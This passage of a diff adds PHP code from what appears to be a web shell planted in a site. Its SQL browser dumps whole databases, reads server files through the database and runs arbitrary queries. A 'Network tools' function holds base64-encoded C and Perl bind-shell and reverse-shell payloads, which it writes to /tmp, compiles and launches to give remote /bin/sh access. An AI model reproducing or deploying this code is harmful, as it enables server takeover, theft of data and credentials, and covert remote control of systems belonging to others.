+                    return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'"); 
+                break; 
+            } 
+            return false; 
+        } 
+        function listTables() { 
+            switch($this->type)    { 
+                case 'mysql': 
+                    return $this->res = $this->query('SHOW TABLES'); 
+                break; 
+                case 'pgsql': 
+                    return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'"); 
+                break; 
+            } 
+            return false; 
+        } 
+        function error() { 
+            switch($this->type)    { 
+                case 'mysql': 
+                    return @mysql_error(); 
+                break; 
+                case 'pgsql': 
+                    return @pg_last_error(); 
+                break; 
+            } 
+            return false; 
+        } 
+        function setCharset($str) { 
+            switch($this->type)    { 
+                case 'mysql': 
+                    if(function_exists('mysql_set_charset')) 
+                        return @mysql_set_charset($str, $this->link); 
+                    else 
+                        $this->query('SET CHARSET '.$str); 
+                    break; 
+                case 'pgsql': 
+                    return @pg_set_client_encoding($this->link, $str); 
+                    break; 
+            } 
+            return false; 
+        } 
+        function loadFile($str) { 
+            switch($this->type)    { 
+                case 'mysql': 
+                    return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file")); 
+                break; 
+                case 'pgsql': 
+                    $this->query("CREATE TABLE hard2(file text);COPY hard2 FROM '".addslashes($str)."';select file from hard2;"); 
+                    $r=array(); 
+                    while($i=$this->fetch()) 
+                        $r[] = $i['file']; 
+                    $this->query('drop table hard2'); 
+                    return array('file'=>implode("\n",$r)); 
+                break; 
+            } 
+            return false; 
+        } 
+        function dump($table, $fp = false) { 
+            switch($this->type)    { 
+                case 'mysql': 
+                    $res = $this->query('SHOW CREATE TABLE `'.$table.'`'); 
+                    $create = mysql_fetch_array($res); 
+                    $sql = $create[1].";\n"; 
+                    if($fp) fwrite($fp, $sql); else echo($sql); 
+                    $this->query('SELECT * FROM `'.$table.'`'); 
+                    $i = 0; 
+                    $head = true; 
+                    while($▟ = $this->fetch()) { 
+                        $sql = ''; 
+                        if($i % 1000 == 0) { 
+                            $head = true; 
+                            $sql = ";\n\n"; 
+                        } 
+                        $columns = array(); 
+                        foreach($▟ as $k=>$v) { 
+                            if($v === null) 
+                                $▟[$k] = "NULL"; 
+                            elseif(is_int($v)) 
+                                $▟[$k] = $v; 
+                            else 
+                                $▟[$k] = "'".@mysql_real_escape_string($v)."'"; 
+                            $columns[] = "`".$k."`"; 
+                        } 
+                        if($head) { 
+                            $sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $▟).')'; 
+                            $head = false; 
+                        } else 
+                            $sql .= "\n\t,(".implode(", ", $▟).')'; 
+                        if($fp) fwrite($fp, $sql); else echo($sql); 
+                        $i++; 
+                    } 
+                    if(!$head) 
+                        if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n"); 
+                break; 
+                case 'pgsql': 
+                    $this->query('SELECT * FROM '.$table); 
+                    while($▟ = $this->fetch()) { 
+                        $columns = array(); 
+                        foreach($▟ as $k=>$v) { 
+                            $▟[$k] = "'".addslashes($v)."'"; 
+                            $columns[] = $k; 
+                        } 
+                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $▟).');'."\n"; 
+                        if($fp) fwrite($fp, $sql); else echo($sql); 
+                    } 
+                break; 
+            } 
+            return false; 
+        } 
+    }; 
+    $db = new DbClass($_POST['type']); 
+    if((@$_POST['p2']=='download') && (@$_POST['p1']!='select')) { 
+        $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); 
+        $db->selectdb($_POST['sql_base']); 
+        switch($_POST['charset']) { 
+            case "Windows-1251": $db->setCharset('cp1251'); break; 
+            case "UTF-8": $db->setCharset('utf8'); break; 
+            case "KOI8-R": $db->setCharset('koi8r'); break; 
+            case "KOI8-U": $db->setCharset('koi8u'); break; 
+            case "cp866": $db->setCharset('cp866'); break; 
+        } 
+        if(empty($_POST['file'])) { 
+            ob_start("ob_gzhandler", 4096); 
+            header("Content-Disposition: attachment; filename=dump.sql"); 
+            header("Content-Type: text/plain"); 
+            foreach($_POST['tbl'] as $v) 
+                $db->dump($v); 
+            exit; 
+        } elseif($fp = @fopen($_POST['file'], 'w')) { 
+            foreach($_POST['tbl'] as $v) 
+                $db->dump($v, $fp); 
+            fclose($fp); 
+            unset($_POST['p2']); 
+        } else 
+            die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>'); 
+    } 
+    hardHeader(); 
+    echo " 
+<h1>Sql browser</h1><div class=content> 
+<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr> 
+<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr> 
+<input type=hidden name=ne value=''><input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'> 
+<td><label><select name='type'><option value='mysql' "; 
+    if(@$_POST['type']=='mysql')echo 'selected'; 
+echo ">MySql</option><option value='pgsql' "; 
+if(@$_POST['type']=='pgsql')echo 'selected'; 
+echo ">PostgreSql</option></select></label></td> 
+<td><input type=text name=sql_host value=\"". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."\"></td> 
+<td><input type=text name=sql_login value=\"". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."\"></td> 
+<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\" required></td><td>"; 
+    $tmp = "<input type=text name=sql_base value=''>"; 
+    if(isset($_POST['sql_host'])){ 
+        if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { 
+            switch($_POST['charset']) { 
+                case "Windows-1251": $db->setCharset('cp1251'); break; 
+                case "UTF-8": $db->setCharset('utf8'); break; 
+                case "KOI8-R": $db->setCharset('koi8r'); break; 
+                case "KOI8-U": $db->setCharset('koi8u'); break; 
+                case "cp866": $db->setCharset('cp866'); break; 
+            } 
+            $db->listDbs(); 
+            echo "<label><select name=sql_base><option value=''></option>"; 
+            while($▟ = $db->fetch()) { 
+                list($key, $value) = each($▟); 
+                echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>'; 
+            } 
+            echo '</select></label>'; 
+        } 
+        else echo $tmp; 
+    }else 
+        echo $tmp; 
+    echo "</td> 
+                <td><input type=submit value='submit' onclick='fs(d.sf);'></td> 
+                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td> 
+            </tr> 
+        </table> 
+        <script> 
+            s_db='".@addslashes($_POST['sql_base'])."'; 
+            function fs(f) { 
+                if(f.sql_base.value!=s_db) { f.onsubmit = function() {}; 
+                    if(f.p1) f.p1.value=''; 
+                    if(f.p2) f.p2.value=''; 
+                    if(f.p3) f.p3.value=''; 
+                } 
+            } 
+            function st(t,l) { 
+                d.sf.p1.value = 'select'; 
+                d.sf.p2.value = t; 
+                if(l && d.sf.p3) d.sf.p3.value = l; 
+                d.sf.submit(); 
+            } 
+            function is() { 
+                for(i=0;i<d.sf.elements['tbl[]'].length;++i) 
+                    d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked; 
+            } 
+        </script>"; 
+    if(isset($db) && $db->link){ 
+        echo "<br/><table width=100% cellpadding=2 cellspacing=0>"; 
+            if(!empty($_POST['sql_base'])){ 
+                $db->selectdb($_POST['sql_base']); 
+                echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>"; 
+                $tbls_res = $db->listTables(); 
+                while($▟ = $db->fetch($tbls_res)) { 
+                    list($key, $value) = each($▟); 
+                    if(!empty($_POST['sql_count'])) 
+                        $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.'')); 
+                    $value = htmlspecialchars($value); 
+                    echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>"; 
+                } 
+                echo "<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>"; 
+                if(@$_POST['p1'] == 'select') { 
+                    $_POST['p1'] = 'query'; 
+                    $_POST['p3'] = $_POST['p3']?$_POST['p3']:1; 
+                    $db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']); 
+                    $num = $db->fetch(); 
+                    $pages = ceil($num['n'] / 30); 
+                    echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">"; 
+                    echo " of $pages"; 
+                    if($_POST['p3'] > 1) 
+                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>"; 
+                    if($_POST['p3'] < $pages) 
+                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>"; 
+                    $_POST['p3']--; 
+                    if($_POST['type']=='pgsql') 
+                        $_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30); 
+                    else 
+                        $_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30'; 
+                    echo "<br><br>"; 
+                } 
+                if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) { 
+                    $db->query(@$_POST['p2']); 
+                    if($db->res !== false) { 
+                        $title = false; 
+                        echo '<table width=100% cellspacing=1 cellpadding=2 class=main>'; 
+                        $line = 1; 
+                        while($▟ = $db->fetch())    { 
+                            if(!$title)    { 
+                                echo '<tr>'; 
+                                foreach($▟ as $key => $value) 
+                                    echo '<th>'.$key.'</th>'; 
+                                reset($▟); 
+                                $title=true; 
+                                echo '</tr><tr>'; 
+                                $line = 2; 
+                            } 
+                            echo '<tr class="l'.$line.'">'; 
+                            $line = $line==1?2:1; 
+                            foreach($▟ as $key => $value) { 
+                                if($value == null) 
+                                    echo '<td><i>null</i></td>'; 
+                                else 
+                                    echo '<td>'.nl2br(htmlspecialchars($value)).'</td>'; 
+                            } 
+                            echo '</tr>'; 
+                        } 
+                        echo '</table>'; 
+                    } else { 
+                        echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>'; 
+                    } 
+                } 
+                echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>"; 
+                if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) 
+                    echo htmlspecialchars($_POST['p2']); 
+                echo "</textarea><br/><input type=submit value='Execute'>"; 
+                echo "</td></tr>"; 
+            } 
+            echo "</table></form><br/>"; 
+            if($_POST['type']=='mysql') { 
+                $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'"); 
+                if($db->fetch()) 
+                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='submit'></form>"; 
+            } 
+            if(@$_POST['p1'] == 'loadfile') { 
+                $file = $db->loadFile($_POST['p2']); 
+                echo '<br/><pre class=ml1>'.htmlspecialchars($file['file']).'</pre>'; 
+            } 
+    } else { 
+        echo htmlspecialchars($db->error()); 
+    } 
+    echo '</div>'; 
+    hardFooter(); 
+} 
+function actionNetwork() { 
+    hardHeader(); 
+    $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
+    $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
+    $bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
+    $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
+    echo "<h1>Network tools</h1><div class=content> 
+    <form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'> 
+    <span>Bind port to /bin/sh</span><br/> 
+    Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'><option value='bpc'>C</option><option value='bpp'>Perl</option></select></label> <input type=submit value='submit'> 
+    </form> 
+    <form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'> 
+    <span>Back-connect to</span><br/> 
+    Server: <input type='text' name='server' value=". $_SERVER['REMOTE_ADDR'] ."> Port: <input type='text' name='port' value='31337'> Using: <label><select name='using'><option value='bcc'>C</option><option value='bcp'>Perl</option></select></label> <input type=submit value='submit'> 
+    </form><br>"; 
+    if(isset($_POST['p1'])) { 
+        function cf($f,$t) { 
+            $w=@fopen($f,"w") or @function_exists('file_put_contents'); 
+            if($w)    { 
+                @fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t)); 
+                @fclose($w); 
+            } 
+        } 
+        if($_POST['p1'] == 'bpc') { 
+            cf("/tmp/bp.c",$bind_port_c); 
+            $▖ = ex("gcc -o /tmp/bp /tmp/bp.c"); 
+            @unlink("/tmp/bp.c"); 
+            $▖ .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &"); 
+            echo "<pre class=ml1>$▖".ex("ps aux | grep bp")."</pre>"; 
+        } 
+        if($_POST['p1'] == 'bpp') { 
+            cf("/tmp/bp.pl",$bind_port_p); 
+            $▖ = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &"); 
+            echo "<pre class=ml1>$▖".ex("ps aux | grep bp.pl")."</pre>"; 
+        } 
+        if($_POST['p1'] == 'bcc') { 
+            cf("/tmp/bc.c",$back_connect_c); 
+            $▖ = ex("gcc -o /tmp/bc /tmp/bc.c"); 
+            @unlink("/tmp/bc.c"); 
+            $▖ .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &"); 
+            echo "<pre class=ml1>$▖".ex("ps aux | grep bc")."</pre>"; 
+        } 
+        if($_POST['p1'] == 'bcp') { 
+            cf("/tmp/bc.pl",$back_connect_p); 
+            $▖ = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &"); 
+            echo "<pre class=ml1>$▖".ex("ps aux | grep bc.pl")."</pre>"; 
+        } 
+    } 
+    echo '</div>'; 
+    hardFooter(); 
+} 
+if( empty($_POST['a']) ) 
+    if(isset($▚) && function_exists('action' . $▚)) 
+        $_POST['a'] = $▚; 
+    else 
+        $_POST['a'] = 'FilesMan'; 
+if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) ) 
+    call_user_func('action' . $_POST['a']); 
+?
